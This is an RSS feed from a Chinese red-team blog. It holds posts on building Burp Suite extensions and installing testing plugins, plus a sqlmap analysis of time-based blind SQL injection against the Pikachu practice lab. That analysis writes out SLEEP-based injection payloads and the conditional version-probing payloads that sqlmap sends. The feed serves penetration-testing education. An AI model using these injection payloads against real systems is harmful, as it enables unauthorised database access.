<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>红队技术 on Y4ph3tS blog</title>
    <link>https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/</link>
    <description>Recent content in 红队技术 on Y4ph3tS blog</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Tue, 12 Jan 2021 04:09:28 +0800</lastBuildDate>
    <atom:link href="https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（下）</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E4%BC%AA%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8B/</link>
      <pubDate>Tue, 12 Jan 2021 04:09:28 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E4%BC%AA%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8B/</guid>
      <description>&lt;p&gt;前两篇文章主要讲了一下Burpsuite的插件，并且介绍了Burpsuite的API，本篇文章主要内容为高级插件的开发。&lt;/p&gt;&#xA;&lt;p&gt;首先在上节内容最后留了一个坑，就是有个报错的问题，其实呢这个问题是我们自己造成的，因为在最后一句写了一个抛出异常的语句，该语句会导致即使没有错误也会报错误，在我们换成如下写法后再编译就不报错了。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们接着来写一个带有图形化选项卡的小插件。带有UI的插件在查阅了一些资料后发现需要Java中AWT和Swing的支持，对Java开发较为熟悉的同学开发起来还是很友好的，这里简单科普一下AWT和Swing。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;AWT(Abstract Window Toolkit)，中文译为抽象窗口工具包，该包提供了一套与本地图形界面进行交互的接口，是Java提供的用来建立和设置Java的图形用户界面的基本工具。AWT中的图形函数与操作系统所提供的图形函数之间有着一一对应的关系，称之为peers，当利用AWT编写图形用户界面时，实际上是在利用本地操作系统所提供的图形库。由于不同操作系统的图形库所提供的样式和功能是不一样的，在一个平台上存在的功能在另一个平台上则可能不存在。为了实现Java语言所宣称的“一次编写，到处运行(write once, run anywhere)”的概念，AWT不得不通过牺牲功能来实现平台无关性，也即AWT所提供的图形功能是各种操作系统所提供的图形功能的交集。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Swing 是一个为Java设计的GUI工具包。Swing是JAVA基础类的一部分。Swing包括了图形用户界面（GUI）器件如：文本框，按钮，分隔窗格和表。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Swing提供许多比AWT更好的屏幕显示元素。它们用纯Java写成，所以同Java本身一样可以跨平台运行，这一点不像AWT。它们是JFC的一部分。它们支持可更换的面板和主题（各种操作系统默认的特有主题），然而不是真的使用原生平台提供的设备，而是仅仅在表面上模仿它们。这意味着你可以在任意平台上使用JAVA支持的任意面板。轻量级组件的缺点则是执行速度较慢，优点就是可以在所有平台上采用统一的行为。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;画图的时候我用了Jpanel和Jbutton，用AWT来捕获鼠标事件，实现点击按钮触发事件。通过getTabCaption和getUiComponent给选项卡命名，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后创建界面和按钮jPanelMain = new JPanel();JButton jButton = new JButton(&amp;ldquo;Test Button&amp;rdquo;);&lt;/p&gt;&#xA;&lt;p&gt;加载成功后可以看到上了一个标签&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以及一个居中的按钮&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;每按一次会输出一个Clicked&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;大致了解了各个API的方法后，我们可以尝试来写一些能够提升我们工作效率的事，首先实现捕获其他模块的消息，以便对消息进行处理。根据官方文档调用以下方法：&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerHttpListener()&lt;/p&gt;&#xA;&lt;p&gt;注册HTTP监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerProxyListener()&lt;/p&gt;&#xA;&lt;p&gt;注册Proxy监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerScannerListener()&lt;/p&gt;&#xA;&lt;p&gt;注册Scanner监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerExtensionStateListener()&lt;/p&gt;&#xA;&lt;p&gt;注册ExtensionState监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerScopeChangeListener()&lt;/p&gt;&#xA;&lt;p&gt;注册ScopeChangeListener监听器&lt;/p&gt;&#xA;&lt;p&gt;首先还是框架的搭建，在公共类BurpExtender中implements所需要调用的接口IBurpExtender, IHttpListener, IProxyListener, IScannerListener, IExtensionStateListener, IScopeChangeListener，引入接口后需要再进行方法重写，不然会报错&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据文档补全接口内容，写上对应的输出&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps9.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;编译后加载插件，此时可以看到输出是空白的，因为该插件用于捕获数据，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们打开Proxy拦截后访问几个网页，在历史中已经记录了很多数据&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再来看我们的插件输出窗口，输出了大量的日志&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果觉得Burpsuite自带的分析工具不好用的话可以直接通过这个插件将捕获到的事件进行输出，只需要在插件控制的输出页面选择保存到文件即可&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps13.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该插件的完整代码如下：&lt;/p&gt;&#xA;&lt;p&gt;package burp;&lt;/p&gt;&#xA;&lt;p&gt;import java.io.PrintWriter;&lt;/p&gt;&#xA;&lt;p&gt;public class BurpExtender implements IBurpExtender, IHttpListener,&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（中）</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%AD/</link>
      <pubDate>Fri, 08 Jan 2021 11:25:18 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%AD/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burp的基础插件安装已经在上一篇文章中讲了，本篇主要讲BP插件的开发，毕竟别人的东西用起来还是自己写的香。本来这篇文章是准备全写完再发出来，但是发现内容真的有亿点点多还是决定拆一下。&lt;/p&gt;&#xA;&lt;p&gt;BP插件的开发语言支持Java和Python，由于BP本来就是Java开发的所以对Java的插件支持也更好，我们在后面的文章中JAVA开发和Python开发都会讲到。在找了半天资料后发现官方给出了一个&lt;a href=&#34;https://portswigger.net/burp/extender/api/index.html&#34;&gt;链接&lt;/a&gt;,这个连接中的文档描述了各种编写规则&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps86.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还给出了一些&lt;a href=&#34;https://portswigger.net/burp/extender/&#34;&gt;实例&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先来讲讲BP开发的基础，了解一下API，来解读一下官方文档&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps87.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一个Interface IBurpCollaboratorClientContext&lt;/p&gt;&#xA;&lt;p&gt;这个接口用于生成payload并与collaborator服务器交互，通过轮询来得到网络交互的数据包。该类接口包含有以下方法，可以接收返回，生成payload，得到collaborator服务器地址等&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;Modifier and Type&lt;/th&gt;&#xA;          &lt;th&gt;Method and Description&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchAllCollaboratorInteractions()&#34;&gt;fetchAllCollaboratorInteractions&lt;/a&gt;() This method is used to retrieve all interactions received by the Collaborator server resulting from payloads that were generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchAllInfiltratorInteractions()&#34;&gt;fetchAllInfiltratorInteractions&lt;/a&gt;() This method is used to retrieve all interactions made by Burp Infiltrator instrumentation resulting from payloads that were generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchCollaboratorInteractionsFor(java.lang.String)&#34;&gt;fetchCollaboratorInteractionsFor&lt;/a&gt;(java.lang.String payload) This method is used to retrieve interactions received by the Collaborator server resulting from a single payload that was generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchInfiltratorInteractionsFor(java.lang.String)&#34;&gt;fetchInfiltratorInteractionsFor&lt;/a&gt;(java.lang.String payload) This method is used to retrieve interactions made by Burp Infiltrator instrumentation resulting from a single payload that was generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.lang.String&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#generatePayload(boolean)&#34;&gt;generatePayload&lt;/a&gt;(boolean includeCollaboratorServerLocation) This method is used to generate new Burp Collaborator payloads.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.lang.String&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#getCollaboratorServerLocation()&#34;&gt;getCollaboratorServerLocation&lt;/a&gt;() This method is used to retrieve the network location of the Collaborator server.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps88.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（上）</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8A/</link>
      <pubDate>Wed, 16 Dec 2020 11:04:32 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8A/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite作为抓包利器，深受安全人员的喜爱。免费的community版本只有非常少的一些功能，而很多功能都在Pro版中，虽然基础功能都能实现，但是Burpsuite就是以强大的模块化拓展功能著称，就像常见的Goby, CS 和蚁剑等工具都非常适合模块化的拓展开发。如此强大的神器在不同版本究竟有什么差异呢，我们先来官网看一看。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps38.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到企业版卖到了3999刀一年，而正常情况下的专业版也是399刀一年。其中专业版的功能支持多了Web vulnerability scanner、Advanced manual tools和Essential manual tools。&lt;/p&gt;&#xA;&lt;p&gt;下面是官网给出的功能解释截图，大家自己看一下就好，我懒得翻译了，顺便说一句：一定要好好学英语。我是不会告诉你们我是好几个技术项目的翻译支持的（有合作意向的大佬除外，兼职翻译欢迎小窗。）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps39.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps40.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps41.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;破解方法网上一搜一大堆，在这里就不多BB了，当然你也可以选择支持正版。下面我们进入正题，开始本篇的重点部分：武装Burpsuite。&lt;/p&gt;&#xA;&lt;p&gt;本篇的介绍环境如下：&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite Pro 2020.7&lt;/p&gt;&#xA;&lt;p&gt;Java 14.0.2 2020-07-14&lt;/p&gt;&#xA;&lt;p&gt;因为新版的Burp好像不支持Java8了，之前用的BP1.7版本还是用的Java8。新版本的Burpsuite反正我觉得界面长的还可以。主界面如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps42.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;新增的功能是内置的浏览器，不用再像以前一样测试的时候浏览器和Burp疯狂切换了。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps43.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite的武装主要是支持拓展的部分也就是模块化的拓展，在Extender模块部分可以看到当前已安装的拓展，为了演示需要我这边找了一个白板Burp&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps44.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burp的插件支持本地加载和商店直接下载，我们先来看看商店中的实用拓展：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps45.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以第一个插件为例，讲讲如何从商店中安装插件，首先选中插件，将右侧栏的滚动条拖到底可以看到install按钮&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps46.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击install后就开始了安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps47.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装成功后可看到installed栏下勾上了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps48.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;不过这玩意的效果好像比较难演示，效果演示我们就放到后面的内容中去。知道了插件的基础安装过程，接下来就是武装的过程了。&lt;/p&gt;&#xA;&lt;p&gt;以下介绍的插件为我自己Burp中安装的一些常用插件，在渗透测试或挖洞时能让工作方便不少。&lt;/p&gt;&#xA;&lt;h2 id=&#34;hae&#34;&gt;&lt;em&gt;HaE&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;2024补充，Key师傅开发的插件，&lt;del&gt;有非常多的策略可以用于各种测试&lt;/del&gt;，总之就是非常牛逼！！！牛逼！！还有不断更新的&lt;a href=&#34;https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Rules.yml&#34;&gt;规则库&lt;/a&gt;，&#xA;使用效果如下（图是网上偷的，自己挖的洞太牛逼了就不放了）：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/1362876-20240520150051446-910956326.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;autorize&#34;&gt;&lt;em&gt;Autorize&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;这是一款强大的自动化越权测试工具，在商店中就可以下载。但是这款工具在安装过程中就要开始踩坑了，并不是直接安装就可以的，为了演示还特地起了一台没环境的虚拟机。&lt;/p&gt;&#xA;&lt;p&gt;在这款工具的安装中我们可以看到需要安装Jython，因为该插件通过Python来进行支持，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps49.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先去https://www.jython.org/download.html下载jython并安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps50.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后在Option选项中选择刚刚安装的jython路径&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps51.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候在进入商店。刷新列表后即可进行安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps52.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装成功后即可在选项卡中看到Autorize&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps53.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在拦截数据包部分可以看到右键选项多了发送到Autorize&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps54.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;测试成功的项会变绿，即存在越权&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps55.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;autorepeater&#34;&gt;&lt;em&gt;AutoRepeater&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;这款工具和上述的差不多，都可以直接在Burp的插件商店里找到。安装完成后的效果和之前的差不多，会多一个选项卡&lt;/p&gt;&#xA;&lt;p&gt;可以把这个插件当做高级版的Repeater&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps56.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同样通过右键发送到插件&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps57.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以在右边自定义一些过滤规则，在大批量发包的时候就不用一个个手工替换会方便很多。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps58.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;并且在多样化的规则中，这个工具同样可以测试越权，支持替换的cookie部分很多&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps59.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（二）——深入理解sqlmap(下)</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/</link>
      <pubDate>Thu, 10 Dec 2020 02:11:09 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;在上篇中我们分析了sqlmap的部分检测逻辑，接下来介绍之前没讲完的部分，并且填上tamper这个坑。&lt;/p&gt;&#xA;&lt;p&gt;我们继续来分析盲注的逻辑，上篇分析的布尔型盲注，本篇分析时间盲注。&lt;/p&gt;&#xA;&lt;p&gt;还是拿靶场说事，先进行正常输入，可以看到相应时间，并且返回为I don’t care who you are.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再来随便测试几个其他的输入，返回均为I don’t care who you are.即使输入特殊字符产生了错误也不会改变，在靶场中我们知道这是一个时间型盲注，但是在实战中可能往往想不到，那如何来验证是时间型盲注呢，这就需要用到sleep函数，sleep函数用于使查询延迟执行，我们可以在navicat中做样例演示，可以看到同样的一条select 123;语句执行时间不同&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所以针对时间型盲注，要判断我们的输入是否执行，只需要加上sleep函数即可，在浏览器的开发人员工具的网络选项卡中，通过瀑布流的形式我们可以看到请求的时间，以下为输入lucy’and sleep (5)#的执行结果，可以看到执行时间超过了五秒&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那是否所有的操作都会延迟呢，我们来试试输入一串明显报错的payload，在跟上了一串的单引号后可以看到请求时间明显缩短，说明payload未执行。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据之前布尔盲注的经验，我们同样可以进行判断，通过if语句判断为真才执行sleep语句，效果如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们所使用的payload为lucy&amp;rsquo; and if ((substr(version(),1,1))=&amp;lsquo;5&amp;rsquo;,sleep(5),null)#&lt;/p&gt;&#xA;&lt;p&gt;sqlmap中的时间盲注就比较简单了，代码如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这边看似简单是因为sqlmap使用了响应延迟判断技术，该种技术使用了前文提到的高斯分布，高斯分布可以识别一个响应是否与普通响应产生于一种机制。在sqlmap的xml文件中包含了各种攻击向量，其中常见的向量为&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们在案例中的测试也使用了其中一个向量，成功的向量如下图所示&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来我们具体分析一下数据包，以下为攻击完整过程的截图&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps9.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来就是紧张刺激的payload分析了，看看wireshark抓到的数据包，由于之前进行了大量其他测试，我们只需要分析time-based Injection即可。追踪到的第一个包是eq50分片&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;url经过转码后如下：&lt;/p&gt;&#xA;&lt;p&gt;/pikachu/vul/sqli/sqli_blind_t.php?name=123&amp;rsquo; AND (SELECT 1671 FROM (SELECT(SLEEP(5)))GSuc) AND &amp;lsquo;sRRR&amp;rsquo;=&amp;lsquo;sRRR&amp;amp;submit=查询&lt;/p&gt;&#xA;&lt;p&gt;此时控制台输出进行了两次询问，因为sqlmap疑似发现存在注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在这之前还有两次和上述相同的发包，应该是用于响应检测。之后就是一系列UNION select的探测，对应的是包含了orderby等参数，与控制台对应输出相同，即1-20列探测。&lt;/p&gt;&#xA;&lt;p&gt;从77组开始请求地址改变，根据之前的分析此时应该进入了误报检测&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以下记录为77开始的payload&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 3753 FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))Ndjp) AND &amp;#39;&lt;/span&gt;HxIh&lt;span 